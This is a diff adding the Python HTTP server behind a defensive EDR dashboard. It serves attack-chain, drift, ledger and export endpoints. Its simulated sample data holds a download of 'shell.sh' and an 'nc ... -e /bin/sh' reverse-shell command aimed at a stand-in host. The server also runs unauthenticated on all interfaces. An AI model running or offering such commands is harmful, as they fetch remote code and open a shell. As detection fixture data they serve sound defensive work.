@@ -1,0 +1,497 @@
+import os
+import json
+import urllib.parse
+import http.server
+import socketserver
+import threading
+import sys
+import socket
+import time
+import platform
+from typing import Dict, Any, List, Optional
+from lotl_edr.utils.logger import setup_logger
+
+logger = setup_logger("dashboard_server")
+
+correlator_instance = None
+drift_detector_instance = None
+grc_ledger_instance = None
+containment_engine_instance = None
+lineage_engine_instance = None
+rule_engine_instance = None
+telemetry_path_instance = None
+GENESIS_HASH = "0000000000000000000000000000000000000000000000000000000000000000"
+
+SEVERITY_BUCKET = {
+    "normal": "normal", "low": "suspicious", "medium": "suspicious",
+    "high": "attack", "critical": "attack",
+}
+
+class ThreadingHTTPServer(socketserver.ThreadingTCPServer):
+    allow_reuse_address = True
+
+class EDRDashboardHandler(http.server.BaseHTTPRequestHandler):
+    def log_message(self, format, *args):
+        logger.debug("%s - - %s" % (self.address_string(), format%args))
+
+    def do_GET(self):
+        parsed_url = urllib.parse.urlparse(self.path)
+        path = parsed_url.path
+        query_params = urllib.parse.parse_qs(parsed_url.query)
+        simulate = "true" in query_params.get("simulate", [])
+
+        static_dir = os.path.join(os.path.dirname(__file__), "static")
+
+        if path == "/" or path == "/index.html":
+            self._serve_file(os.path.join(static_dir, "index.html"), "text/html")
+        elif path == "/app.css":
+            self._serve_file(os.path.join(static_dir, "app.css"), "text/css")
+        elif path == "/app.js":
+            self._serve_file(os.path.join(static_dir, "app.js"), "application/javascript")
+        elif path == "/api/status":
+            self._send_json(self._get_status(simulate))
+        elif path == "/api/chains":
+            self._send_json(self._get_chains(simulate))
+        elif path == "/api/drift":
+            self._send_json(self._get_drift(simulate))
+        elif path == "/api/ledger":
+            self._send_json(self._get_ledger(simulate))
+        elif path == "/api/export":
+            self._handle_export(simulate)
+        elif path == "/api/rules":
+            self._send_json(self._get_rules())
+        elif path == "/api/event_counts":
+            self._send_json(self._get_event_counts())
+        elif path == "/api/system_stats":
+            self._send_json(self._get_system_stats())
+        elif path == "/api/timeline":
+            self._send_json(self._get_timeline())
+        else:
+            self.send_error(404, "File Not Found")
+
+    def do_POST(self):
+        parsed_url = urllib.parse.urlparse(self.path)
+        path = parsed_url.path
+
+        if path == "/api/containment/revert":
+            content_length = int(self.headers.get("Content-Length", 0))
+            post_data = self.rfile.read(content_length)
+            try:
+                payload = json.loads(post_data.decode("utf-8"))
+                action_id = payload.get("action_id")
+                success = self._revert_containment(action_id)
+                self._send_json({"success": success, "message": f"Rollback executed. Success: {success}"})
+            except Exception as e:
+                self.send_error(400, f"Invalid JSON payload: {e}")
+        else:
+            self.send_error(404, "Endpoint Not Found")
+
+    def _serve_file(self, filepath: str, content_type: str) -> None:
+        if not os.path.exists(filepath):
+            self.send_error(404, f"File {os.path.basename(filepath)} Not Found")
+            return
+
+        try:
+            with open(filepath, "rb") as f:
+                content = f.read()
+            self.send_response(200)
+            self.send_header("Content-Type", content_type)
+            self.send_header("Content-Length", str(len(content)))
+            self.end_headers()
+            self.wfile.write(content)
+        except Exception as e:
+            self.send_error(500, f"Error reading file: {e}")
+
+    def _send_json(self, data: Any, status: int = 200) -> None:
+        try:
+            body = json.dumps(data, indent=4).encode("utf-8")
+            self.send_response(status)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+        except Exception as e:
+            self.send_error(500, f"Error encoding JSON: {e}")
+
+    def _get_status(self, simulate: bool) -> Dict[str, Any]:
+        global correlator_instance, drift_detector_instance, grc_ledger_instance
+
+        if simulate or not drift_detector_instance:
+            return {
+                "hostname": socket.gethostname(),
+                "compliance_percent": 91.67,
+                "drift_percent": 8.33,
+                "active_alerts_count": 1,
+                "ledger_status": "INTEGRITY_VERIFIED",
+                "system_status": "SECURED"
+            }
+
+        drift_report = drift_detector_instance.check_drift()
+        active_chains = list(correlator_instance.active_chains)
+        ledger_report = grc_ledger_instance.verify_ledger_integrity()
+        ledger_status = "INTEGRITY_VERIFIED" if ledger_report["integrity_valid"] else "TAMPER_DETECTED"
+
+        return {
+            "hostname": socket.gethostname(),
+            "compliance_percent": drift_report.get("compliance_percent", 100.0),
+            "drift_percent": drift_report.get("drift_percent", 0.0),
+            "active_alerts_count": len(active_chains),
+            "ledger_status": ledger_status,
+            "system_status": "SECURED" if not active_chains else "INCIDENT_ACTIVE"
+        }
+
+    def _get_chains(self, simulate: bool) -> List[Dict[str, Any]]:
+        global correlator_instance, lineage_engine_instance
+
+        if simulate or not correlator_instance:
+            return [{
+                "chain_id": "simulated-chain-999",
+                "risk_score": 65.0,
+                "confidence_score": 95.0,
+                "confidence_tier": "Critical",
+                "should_contain": True,
+                "created_at": time.time() - 30,
+                "last_updated": time.time(),
+                "duration_seconds": 30,
+                "events_count": 3,
+                "process_tree": {
+                    "pid": 2000, "name": "bash", "exe": "/bin/bash",
+                    "cmdline": "/bin/bash --login", "status": "active",
+                    "children": [
+                        {"pid": 3000, "name": "curl", "exe": "/usr/bin/curl",
+                         "cmdline": "curl http://10.0.0.5/shell.sh", "status": "exited", "children": []},
+                        {"pid": 4000, "name": "nc", "exe": "/usr/bin/nc",
+                         "cmdline": "nc 10.0.0.5 4444 -e /bin/sh", "status": "active", "children": []}
+                    ]
+                },
+                "events": [
+                    {"timestamp": "2026-07-10T12:00:00Z", "source": "auth_log", "event_type": "auth_session", "exe": "/usr/sbin/sshd", "cmdline": "sshd: root [accepted]"},
+                    {"timestamp": "2026-07-10T12:00:01Z", "source": "auditd", "event_type": "process_exec", "exe": "/usr/bin/curl", "cmdline": "curl http://10.0.0.5/shell.sh"},
+                    {"timestamp": "2026-07-10T12:00:02Z", "source": "ebpf", "event_type": "network_connect", "exe": "/usr/bin/nc", "cmdline": "nc 10.0.0.5 4444 -e /bin/sh"}
+                ]
+            }]
+
+        results = []
+        # FIX: previously only active_chains were shown -- the moment a
+        # chain went 60s(now 600s) inactive it vanished from the
+        # dashboard entirely, even though EventCorrelator never deletes
+        # it (just moves it to archived_chains). Now includes the most
+        # recent 20 archived chains too, so nothing disappears from view;
+        # only NEW-event correlation eligibility is time-limited, not
+        # visibility of what already happened.
+        all_chains = list(correlator_instance.active_chains) + list(correlator_instance.archived_chains)[-20:]
+        for chain in all_chains:
+            root_process = None
+            if chain.events:
+                pids = {ev.pid for ev in chain.events}
+                for pid in pids:
+                    node = lineage_engine_instance.nodes.get(pid) if lineage_engine_instance else None
+                    if node:
+                        curr = node
+                        while lineage_engine_instance and curr.ppid in lineage_engine_instance.nodes and curr.ppid not in [0, 1]:
+                            curr = lineage_engine_instance.nodes[curr.ppid]
+                        root_process = self._build_frontend_tree(curr.pid)
+                        break
+
+            confidence_score = 15.0
+            confidence_tier = "Monitor"
+            should_contain = False
+
+            try:
+                from lotl_edr.confidence_engine.engine import ConfidenceEngine
+                from lotl_edr.risk_engine.engine import RiskEngine
+                re = RiskEngine()
+                re.add_alert("root", None, 1, chain.chain_id, 10.0)
+                ce = ConfidenceEngine(re)
+                res = ce.calculate_confidence(chain)
+                confidence_score = res["confidence_score"]
+                confidence_tier = res["tier"]
+                should_contain = res["should_contain"]
+            except Exception:
+                pass
+
+            results.append({
+                "chain_id": chain.chain_id,
+                "risk_score": round(chain.accumulated_risk, 2),
+                "confidence_score": confidence_score,
+                "confidence_tier": confidence_tier,
+                "should_contain": should_contain,
+                "created_at": chain.created_at,
+                "last_updated": chain.last_updated,
+                "duration_seconds": round(chain.last_updated - chain.created_at, 1),
+                "events_count": len(chain.events),
+                "process_tree": root_process or {},
+                "events": [(ev.model_dump() if hasattr(ev, "model_dump") else ev.dict()) for ev in chain.events]
+            })
+        return results
+
+    def _build_frontend_tree(self, pid: int) -> Dict[str, Any]:
+        global lineage_engine_instance
+        node = lineage_engine_instance.nodes.get(pid) if lineage_engine_instance else None
+        if not node:
+            return {}
+
+        children = []
+        for child_pid in node.children:
+            child_tree = self._build_frontend_tree(child_pid)
+            if child_tree:
+                children.append(child_tree)
+
+        return {
+            "pid": node.pid, "name": os.path.basename(node.exe), "exe": node.exe,
+            "cmdline": node.cmdline, "status": node.status, "children": children
+        }
+
+    def _get_drift(self, simulate: bool) -> List[Dict[str, Any]]:
+        global drift_detector_instance
+
+        if simulate or not drift_detector_instance:
+            return [
+                {
+                    "entity": "sshd_config.PermitRootLogin",
+                    "drift_type": "MODIFIED",
+                    "details": "SSH parameter 'PermitRootLogin' is set to 'yes'. Secure baseline expects 'no'.",
+                    "severity": "critical",
+                    "affected_control": "CIS 5.2.1",
+                    "recommended_remediation": "Change directive to 'PermitRootLogin no' in /etc/ssh/sshd_config and restart sshd."
+                }
+            ]
+
+        report = drift_detector_instance.check_drift()
+        return report.get("violations", [])
+
+    def _get_ledger(self, simulate: bool) -> Dict[str, Any]:
+        global grc_ledger_instance
+
+        if simulate or not grc_ledger_instance:
+            return {
+                "integrity_valid": True,
+                "tampered_index": None,
+                "error_message": None,
+                "blocks": [
+                    {
+                        "incident_id": "simulated-incident-001",
+                        "timestamp": "2026-07-10T12:00:00.000Z",
+                        "hostname": socket.gethostname(),
+                        "user": "root",
+                        "mitre_tactics": ["Command and Control"],
+                        "mitre_techniques": ["T1105"],
+                        "nist_800_53": ["SI-4"],
+                        "sox_itgc": ["Access Control"],
+                        "risk_score": 65.0,
+                        "containment_actions": ["BLOCK_IP", "QUARANTINE_FILE"],
+                        "previous_hash": GENESIS_HASH,
+                        "current_hash": "42ffab8623bca0192e21b8a9e2110c42dcd44820bc014022a10bf8b9e1e2d42a"
+                    }
+                ]
+            }
+
+        blocks = []
+        if os.path.exists(grc_ledger_instance.ledger_path):
+            try:
+                with open(grc_ledger_instance.ledger_path, "r", encoding="utf-8") as f:
+                    for line in f:
+                        if line.strip():
+                            blocks.append(json.loads(line))
+            except Exception as e:
+                logger.error(f"Error reading ledger for dashboard api: {e}")
+
+        audit_res = grc_ledger_instance.verify_ledger_integrity()
+        return {
+            "integrity_valid": audit_res["integrity_valid"],
+            "tampered_index": audit_res["tampered_index"],
+            "error_message": audit_res["error_message"],
+            "blocks": blocks
+        }
+
+    def _revert_containment(self, action_id: str) -> bool:
+        global containment_engine_instance
+        if not containment_engine_instance:
+            logger.warning(f"[SIMULATED] Reverted containment action {action_id}")
+            return True
+
+        return containment_engine_instance.revert_action(action_id)
+
+    def _get_rules(self) -> Dict[str, Any]:
+        """Returns rule_id -> {tactics, techniques, severity} for every
+        loaded YAML rule, so the frontend can show real MITRE info
+        instead of raw rule IDs."""
+        global rule_engine_instance
+        if not rule_engine_instance:
+            return {}
+        out = {}
+        for rule in rule_engine_instance.rules:
+            out[rule["id"]] = {
+                "name": rule.get("name", ""),
+                "tactics": rule.get("mitre_tactics", []),
+                "techniques": rule.get("mitre_techniques", []),
+                "severity": rule.get("severity", "low"),
+            }
+        return out
+
+    def _get_event_counts(self) -> Dict[str, Any]:
+        """Scans the telemetry file and buckets events into
+        normal/suspicious/attack by highest_severity, for the dashboard
+        graph. Simple full-file count -- fine for typical capstone-scale
+        telemetry volumes; would need incremental caching for very large
+        production logs."""
+        global telemetry_path_instance
+        counts = {"normal": 0, "suspicious": 0, "attack": 0}
+        if not telemetry_path_instance or not os.path.exists(telemetry_path_instance):
+            return counts
+        try:
+            with open(telemetry_path_instance, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    line = line.strip()
+                    if not line:
+                        continue
+                    try:
+                        ev = json.loads(line)
+                    except Exception:
+                        continue
+                    sev = (ev.get("highest_severity") or "normal").lower()
+                    bucket = SEVERITY_BUCKET.get(sev, "normal")
+                    counts[bucket] += 1
+        except Exception as e:
+            logger.error(f"Error computing event counts: {e}")
+        return counts
+
+    def _get_timeline(self) -> list:
+        """
+        FIX: unlike /api/chains (which only shows events from chains
+        still active in EventCorrelator's 60-second memory window),
+        this reads directly from the persistent telemetry file -- so
+        a suspicious/attack event stays visible on the dashboard even
+        after its chain has aged out and been archived. Returns the
+        most recent 200 non-normal-severity events.
+        """
+        global telemetry_path_instance
+        if not telemetry_path_instance or not os.path.exists(telemetry_path_instance):
+            return []
+        results = []
+        try:
+            with open(telemetry_path_instance, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    line = line.strip()
+                    if not line:
+                        continue
+                    try:
+                        ev = json.loads(line)
+                    except Exception:
+                        continue
+                    sev = (ev.get("highest_severity") or "normal").lower()
+                    if sev == "normal":
+                        continue
+                    results.append(ev)
+        except Exception as e:
+            logger.error(f"Error reading timeline: {e}")
+        return results[-200:]
+
+    def _read_cpu_times(self):
+        with open("/proc/stat") as f:
+            parts = f.readline().split()
+        values = [int(x) for x in parts[1:]]
+        idle = values[3] + values[4]
+        total = sum(values)
+        return total, idle
+
+    def _get_system_stats(self) -> Dict[str, Any]:
+        try:
+            total1, idle1 = self._read_cpu_times()
+            time.sleep(0.25)
+            total2, idle2 = self._read_cpu_times()
+            total_delta = total2 - total1
+            idle_delta = idle2 - idle1
+            cpu_percent = 0.0 if total_delta <= 0 else 100.0 * (1.0 - idle_delta / total_delta)
+
+            mem_total = mem_available = 0
+            with open("/proc/meminfo") as f:
+                for line in f:
+                    if line.startswith("MemTotal:"):
+                        mem_total = int(line.split()[1])
+                    elif line.startswith("MemAvailable:"):
+                        mem_available = int(line.split()[1])
+            mem_percent = 0.0 if mem_total == 0 else 100.0 * (1.0 - mem_available / mem_total)
+
+            return {
+                "cpu_percent": round(cpu_percent, 1),
+                "mem_percent": round(mem_percent, 1),
+                "mem_used_mb": round((mem_total - mem_available) / 1024, 0),
+                "mem_total_mb": round(mem_total / 1024, 0),
+            }
+        except Exception as e:
+            logger.error(f"Error reading system stats: {e}")
+            return {"cpu_percent": 0.0, "mem_percent": 0.0, "mem_used_mb": 0, "mem_total_mb": 0}
+
+    def _handle_export(self, simulate: bool) -> None:
+        global grc_ledger_instance
+
+        report_text = f"=== GRC AUDIT REPORT - LOTL EDR PLATFORM ===\n"
+        report_text += f"Report Compiled At: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}\n"
+        report_text += f"Host Hostname: {socket.gethostname()}\n"
+        report_text += f"OS Architecture: {platform.system()} {platform.release()}\n"
+        report_text += f"--------------------------------------------\n\n"
+
+        blocks = []
+        ledger_status = "VERIFIED"
+
+        if simulate or not grc_ledger_instance:
+            blocks = [{
+                "incident_id": "simulated-incident-001",
+                "timestamp": "2026-07-10T12:00:00Z",
+                "user": "root",
+                "mitre_tactics": ["Command and Control"],
+                "nist_800_53": ["SI-4"],
+                "risk_score": 65.0,
+                "current_hash": "42ffab8623bca0192e21b8a9e2110c42dcd"
+            }]
+        else:
+            if os.path.exists(grc_ledger_instance.ledger_path):
+                try:
+                    with open(grc_ledger_instance.ledger_path, "r", encoding="utf-8") as f:
+                        for line in f:
+                            if line.strip():
+                                blocks.append(json.loads(line))
+                except Exception:
+                    pass
+            audit_res = grc_ledger_instance.verify_ledger_integrity()
+            ledger_status = "INTEGRITY_VERIFIED" if audit_res["integrity_valid"] else "TAMPER_DETECTED (FAILED)"
+
+        report_text += f"GRC LEDGER BLOCKCHAIN INTEGRITY STATUS: {ledger_status}\n"
+        report_text += f"Total Logged Incidents: {len(blocks)}\n\n"
+
+        for idx, b in enumerate(blocks):
+            report_text += f"--- Incident #{idx+1} ({b.get('incident_id')}) ---\n"
+            report_text += f"  Timestamp: {b.get('timestamp')}\n"
+            report_text += f"  Attacker Account: {b.get('user')}\n"
+            report_text += f"  MITRE Tactics: {', '.join(b.get('mitre_tactics', []))}\n"
+            report_text += f"  NIST 800-53: {', '.join(b.get('nist_800_53', []))}\n"
+            report_text += f"  SOX ITGC Control: {', '.join(b.get('sox_itgc', []))}\n"
+            report_text += f"  Impact Risk: {b.get('risk_score')}\n"
+            report_text += f"  Containment Actions: {', '.join(b.get('containment_actions', []))}\n"
+            report_text += f"  Block SHA-256 Hash: {b.get('current_hash')}\n\n"
+
+        report_data = report_text.encode("utf-8")
+
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain")
+        self.send_header("Content-Disposition", "attachment; filename=grc_compliance_report.txt")
+        self.send_header("Content-Length", str(len(report_data)))
+        self.end_headers()
+        self.wfile.write(report_data)
+
+def start_server(port: int = 8000) -> ThreadingHTTPServer:
+    server = ThreadingHTTPServer(("0.0.0.0", port), EDRDashboardHandler)
+    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
+    server_thread.start()
+    logger.info(f"SOC Dashboard Server started at: http://0.0.0.0:{port}/")
+    return server
+
+if __name__ == "__main__":
+    import time
+    srv = start_server(port=8000)
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        logger.info("Stopping dashboard server...")
